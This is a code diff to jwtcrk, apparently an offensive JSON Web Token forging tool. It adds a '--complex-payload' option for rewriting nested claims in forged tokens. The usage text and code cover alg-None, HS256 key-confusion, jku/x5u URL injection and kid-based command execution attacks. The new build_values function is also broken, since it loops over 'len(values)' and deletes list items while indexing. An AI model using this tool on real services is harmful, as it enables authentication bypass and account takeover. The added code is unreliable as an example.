@@ -90,6 +90,13 @@ class Cracker:
                                     the new header, so you should run an attack that will process
                                     that header.]
         -d --decode                [Decode the token and quit.]
+           --complex-payload <key#key#...>:<value,...>
+                                   [An options to change payload subclaims. If you can access a claim
+                                    with one key, use --payload. Else, if you need to go deeper in
+                                    the payload object, use this options passing the keys and the
+                                    values as a key:value pair. The keys must be separated by '#',
+                                    while the value will usually be only one. If you want to inject
+                                    a list of values, pass them as comma separated ones.]
            --unverified            [Act as the host does not verify the signature.]
            --auto-try <hostname>   [If it's present the script will retrieve the key
                                     using openssl. If the host uses this key to signs
@@ -138,6 +145,7 @@ class Cracker:
         jwtcrk <token> --decode
         jwtcrk <token> --alg None --payload <key>:<value>
         jwtcrk <token> --alg HS256 --key <path_to_public.pem> --payload <key>:<value>
+        jwtcrk <token> --alg hs256 --complex-payload <key1#key2#key3>:<value> --unverified
         jwtcrk <token> --alg RS256 --payload <key>:<value> --jku-basic http://myurl.com
         jwtcrk <token> --alg rs256 -p <key>:<value> --jku-redirect https://example.com?redirect=HERE&foo=bar,https://myurl.com
         jwtcrk <token> --alg rs256 -p <key>:<vaue> --add-into header:x5u --x5u-basic http://myurl.com
@@ -153,14 +161,15 @@ class Cracker:
 {Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
         """
 
-    def __init__(self, token, alg, path_to_key, user_payload, remove_from, add_into, auto_try, kid, kid_curl_info, exec_via_kid, specified_key,
-                 jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, unverified=False, decode=False, manual=False,
-                 generate_jwk=False):
+    def __init__(self, token, alg, path_to_key, user_payload, complex_payload, remove_from, add_into, auto_try, kid, kid_curl_info, exec_via_kid,
+                 specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, unverified=False, decode=False,
+                 manual=False, generate_jwk=False):
         """
         :param token: The user input token -> str.
         :param alg: The algorithm for the attack. HS256 or None -> str.
         :param path_to_key: The path to the public.pem, if the alg is HS256 -> str.
         :param user_payload: What the user want to change in the payload -> list.
+        :param complex_payload: A string containins key separated by # to access subclaims -> str
         :param remove_from: What the user want to delete in the header or in the payload -> list.
         :param add_into: What the user want to add in the header (useless in the payload) -> list.
         :param auto_try: The hostname from which the script try to retrieve a key via openssl -> str.
@@ -191,6 +200,7 @@ class Cracker:
         self.file = None
         self.key = None
         self.user_payload = user_payload
+        self.complex_payload = complex_payload
         self.remove_from = remove_from
         self.add_into = add_into
         self.auto_try = auto_try
@@ -518,6 +528,9 @@ class Cracker:
         if self.user_payload:
             for item in self.user_payload:
                 payload_dict = Cracker.change_payload(item[0], payload_dict)
+        if self.complex_payload:
+            for item in self.complex_payload:
+                payload_dict = Cracker.modify_payload_complex(item[0], payload_dict)
         if self.remove_from:
             for item in self.remove_from:
                 try:
@@ -915,6 +928,75 @@ class Cracker:
         return encoded_header + "." + encoded_payload
 
     @staticmethod
+    def build_keys(string):
+        """
+        Build a list of keys
+        :param string: A string containing the kyes, separated by '#' -> str
+
+        The function first check for the separator, and quits out if is not present. Then split the string and check for
+        integers ones.
+
+        :return: The list of keys, or None if separator is not present in string
+        """
+        if "#" not in string:
+            return None
+        keys = string.split("#")
+        for i in range(len(keys)):
+            try:
+                keys[i] = int(keys[i])
+            except ValueError:
+                continue
+        return keys
+
+    @staticmethod
+    def build_values(string):
+        """
+        Build a list of values
+        :param string: A string containig one value, or a list of them separated by commas -> str
+
+        If at least one comma is present in the string, the function splits it by commas. Then it checks in the returned
+        list, if any empy string exists and, case it is, deletes them.
+
+        :return: The values list, if string contained values comma separated, else the string itself.
+        """
+        if "," in string:
+            values = string.split(",")
+            for i in len(values):
+                if values[i] == "":
+                    values.remove(values[i])
+            return values
+        return string
+
+    @staticmethod
+    def modify_payload_complex(string, iterable):
+        """
+        :param string: A key:value pair where key is a set of keys separated by #, and values by commas -> str
+        :param iterable: The payload dictionary -> dict
+
+        The function calls build_keys and build_values, passing them the rith part of the string (splitted by ':').
+        Then it iterates trough the keys list builing the path to iterable item to be changed. When the item
+        has been accessed (the last iteration in the keys list), it assign it the value generated by build_vals
+
+        :return: The modified payload dictionary
+        """
+        keys = Cracker.build_keys(string.split(":")[0].strip("#"))
+        vals = Cracker.build_values(string.split(":")[1].lstrip(","))
+        if keys is None:
+            print(f"{Bcolors.FAIL}jwt: err: Can't split keys basing on '#'. If you can access the claim using a single key, pleas use --payload{Bcolors.ENDC}")
+            sys.exit(2)
+        i = 0
+        for key in keys:
+            if i == 0:
+                keys_path = iterable[key]
+            else:
+                if i == len(keys) -1:
+                    keys_path[key] = vals
+                    break
+                keys_path = keys_path[key]
+            i += 1
+        return iterable
+
+    @staticmethod
     def get_key_from_ssl_cert(hostname):
         """
         :param hostname. The hostname of which you want to retrieve the cert -> str
@@ -1052,9 +1134,9 @@ if __name__ == '__main__':
                         required=False
                         )
     parser.add_argument("--complex-payload", action="append", nargs="+",
-                        help="Acces subclaims. Build a string as keys (separated by '#', in the write order) values (separated by ',' if more than one) as comma separated values.",
-                        metavar="<key#key#key:value>", required=False
-                       )
+                        help="Acces subclaims. Pass keys (separated by '#', in the write order) and values (separated by ',' if more than one) as key:values pairs.",
+                        metavar="<key#key...>:<value>", required=False
+                        )
     parser.add_argument("--remove-from", action="append", nargs="+",
                         help="The section of the token, and the key name to delete as key:value pairs",
                         metavar="<section>:<key>", required=False,
@@ -1120,9 +1202,9 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     cracker = Cracker(
-        args.token, args.alg, args.key, args.payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid, args.kid_curl_info,
-        args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.x5u_inbody,
-        args.unverified, args.decode, args.manual, args.generate_jwk,
+        args.token, args.alg, args.key, args.payload, args.complex_payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid,
+        args.kid_curl_info, args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic,
+        args.x5u_inbody, args.unverified, args.decode, args.manual, args.generate_jwk,
     )
     # Start the cracker
     cracker.run()
